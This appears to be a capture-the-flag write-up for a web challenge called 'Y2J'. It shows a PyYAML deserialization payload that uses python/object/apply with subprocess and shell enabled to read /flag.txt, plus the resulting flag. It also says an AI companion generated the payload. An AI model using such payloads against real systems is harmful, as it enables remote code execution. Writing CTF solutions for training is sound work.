@@ -1,0 +1,40 @@
+Name: Y2J
+Value: 331 points
+Category: Web
+Solves: 186 Solves 
+Author: @JohnHammond#6971
+
+Description: 
+Everyone was so worried about Y2K, but apparently it was a typo all along!!
+
+The real world-ending fears were from Y2J!
+
+Find the flag.txt file in the root of the filesystem.
+
+Press the Start button on the top-right to begin this challenge.
+
+Connect with:
+http://challenge.ctf.games:31323
+
+Solution:
+
+1. Start out by launching the challenge URL to find that this is a deseralization challenge. In this case, we're
+   deserializing YAML to Python.
+
+   	a. https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization
+
+2. Using our trust AI companion we can feed HackTricks in and generate a neat-o burrito payload without feeling
+   an ounce of shame or guilt. 
+
+   	a. Note: It took a few tries but eventually we got a working payload
+
+   	!!python/object/apply:subprocess.check_output
+	args:
+	  - ["cat /flag.txt"]
+	kwds:
+	  shell: true
+	  text: true
+
+  "flag{b20870a1955ac22377045e3b2dcb832a}\n"
+
+3. Flag: flag{b20870a1955ac22377045e3b2dcb832a}
